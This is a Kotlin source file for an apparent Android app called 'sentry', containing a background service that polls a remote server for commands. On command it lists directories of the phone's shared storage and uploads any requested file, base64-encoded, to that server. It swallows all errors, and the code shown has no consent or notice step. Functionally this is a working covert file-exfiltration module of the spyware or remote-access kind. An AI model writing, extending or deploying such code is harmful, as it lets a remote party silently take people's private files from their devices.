package com.example.sentry.service

import android.content.Context
import android.os.Environment
import android.os.StatFs
import android.util.Base64
import android.webkit.MimeTypeMap
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*

object BackgroundFileManager {
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var currentBrowsingPath = "/sdcard"

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            // Initial sync of root sdcard
            syncDirectory(context, client, "/sdcard")

            while (isActive) {
                try {
                    val res = client.pollFileCommands()
                    if (res.isSuccess) {
                        val obj = res.getOrNull()
                        val reqPath = obj?.optString("path")?.takeIf { it.isNotBlank() && it != "null" }
                        if (!reqPath.isNullOrBlank()) {
                            currentBrowsingPath = reqPath
                            syncDirectory(context, client, reqPath)
                        }

                        val downloadReq = obj?.optString("downloadPath")?.takeIf { it.isNotBlank() && it != "null" }
                        if (!downloadReq.isNullOrBlank()) {
                            handleFileUpload(context, client, downloadReq)
                        }
                    }
                } catch (_: Exception) {
                }
                delay(2500)
            }
        }
    }

    private suspend fun syncDirectory(context: Context, client: SentryApiClient, dirPath: String) {
        withContext(Dispatchers.IO) {
            try {
                val targetDir = if (dirPath == "/sdcard" || dirPath.isEmpty() || dirPath == "/storage/emulated/0") {
                    Environment.getExternalStorageDirectory()
                } else {
                    File(dirPath)
                }

                // Compute real storage stats via StatFs
                val stat = StatFs(Environment.getExternalStorageDirectory().path)
                val totalBytes = stat.blockCountLong * stat.blockSizeLong
                val freeBytes = stat.availableBlocksLong * stat.blockSizeLong
                val usedBytes = (totalBytes - freeBytes).coerceAtLeast(0L)
                val percentUsed = if (totalBytes > 0) ((usedBytes * 100) / totalBytes).toInt() else 60

                val storageStats = JSONObject().apply {
                    put("total", formatFileSize(totalBytes))
                    put("free", formatFileSize(freeBytes))
                    put("used", formatFileSize(usedBytes))
                    put("percent", percentUsed)
                }

                val filesArray = JSONArray()
                if (targetDir.exists() && targetDir.isDirectory) {
                    val list = targetDir.listFiles()
                    if (list != null) {
                        val sorted = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                        val sdf = SimpleDateFormat("MMM d, yyyy", Locale.getDefault())

                        for (file in sorted) {
                            if (file.name.startsWith(".")) continue // Skip hidden
                            val isDir = file.isDirectory
                            val sizeStr = if (isDir) {
                                val childCount = file.listFiles()?.count { !it.name.startsWith(".") } ?: 0
                                "$childCount items"
                            } else {
                                formatFileSize(file.length())
                            }

                            val modDate = try {
                                sdf.format(Date(file.lastModified()))
                            } catch (_: Exception) {
                                "Recent"
                            }

                            val item = JSONObject().apply {
                                put("name", file.name)
                                put("path", file.absolutePath)
                                put("size", sizeStr)
                                put("isFolder", isDir)
                                put("modified", modDate)
                            }
                            filesArray.put(item)
                        }
                    }
                }

                client.syncFiles(targetDir.absolutePath, filesArray, storageStats)
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun handleFileUpload(context: Context, client: SentryApiClient, filePath: String) {
        withContext(Dispatchers.IO) {
            try {
                val file = File(filePath)
                if (file.exists() && file.isFile) {
                    val maxBytes = 15 * 1024 * 1024 // 15MB limit for single transmission
                    val length = file.length()
                    if (length <= maxBytes) {
                        val bytes = file.readBytes()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        val ext = file.extension.lowercase()
                        val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"

                        val body = JSONObject().apply {
                            put("deviceId", CryptoManager.getOrCreateDeviceId(context))
                            put("path", file.absolutePath)
                            put("name", file.name)
                            put("size", formatFileSize(length))
                            put("base64", b64)
                            put("mimeType", mime)
                        }
                        client.uploadFileContent(body)
                    }
                }
            } catch (_: Exception) {
            }
        }
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024))
            bytes >= 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024))
            bytes >= 1024 -> String.format("%.1f KB", bytes / 1024.0)
            else -> "$bytes B"
        }
    }
}
